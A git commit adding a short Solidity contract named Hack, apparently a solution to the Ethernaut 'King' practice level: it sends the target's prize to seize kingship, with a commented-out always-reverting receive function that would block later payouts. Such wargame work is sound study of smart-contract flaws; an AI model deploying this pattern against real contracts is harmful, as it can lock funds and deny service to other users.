d8512bf9d96043e1b0744507fd3b615b3fdcb994
Saicharan <81006148+saicharan0124@users.noreply.github.com>
2023-02-06 23:46:57 +0530

    Create king.sol

---
+++ ethernaut/king.sol
@@ -0,0 +1,19 @@
+pragma solidity ^0.8;
+
+interface IKing {
+    function prize() external view returns (uint256);
+    function _king() external view returns (address);
+}
+
+contract Hack {
+    constructor(address payable _target) payable {
+        uint256 prize = IKing(_target).prize();
+       
+        (bool ok,) = _target.call{value: prize}("");
+        require(ok, "tx failed");
+    }
+
+    // receive() external payable {
+    //     require(false, "always fail");
+    // }
+}
